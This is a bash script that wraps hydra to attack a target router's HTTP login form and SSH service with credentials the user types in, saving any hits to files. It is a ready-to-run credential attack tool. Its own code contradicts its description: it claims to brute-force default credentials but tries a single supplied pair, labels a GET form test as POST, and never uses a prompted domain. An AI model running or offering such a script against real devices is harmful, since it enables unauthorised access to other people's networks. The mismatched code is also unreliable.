#!/usr/bin/env bash
# router_creds.sh
# 2. Router Credentials Tester
# Brute-forces default creds over HTTP login form and SSH.
# Usage: ./router_creds.sh
# Requires: hydra

function detect_os() {
  case "$(uname -s)" in
    Linux*) echo "linux" ;;
    Darwin*) echo "darwin" ;;
    *) echo "unknown" ;;
  esac
}

function ensure_tool() {
  local t=$1
  if ! command -v "$t" &>/dev/null; then
    echo "[!] $t not found, installing..."
    if [[ "$(detect_os)" == "darwin" ]]; then
      brew install "$t"
    elif [[ "$(detect_os)" == "linux" ]]; then
      sudo apt-get update && sudo apt-get install -y "$t"
    else
      echo "[-] Unsupported OS: $t"; exit 1
    fi
  fi
}

function get_credentials() {
  read -rp "Enter target IP or hostname: " TARGET
  read -rp "Enter domain (if required, else blank): " DOMAIN
  read -rp "Enter username: " USER
  read -rsp "Enter password: " PASS
  echo
}

# Ensure dependencies
ensure_tool hydra
# Prompt
get_credentials

# HTTP POST login test (update form details as needed)
hydra -L <(echo "$USER")       -P <(echo "$PASS")       $TARGET http-get-form "/login:username=^USER^&password=^PASS^:F=incorrect"       -o http_creds.txt

# SSH brute
hydra -L <(echo "$USER")       -P <(echo "$PASS")       ssh://$TARGET       -o ssh_creds.txt
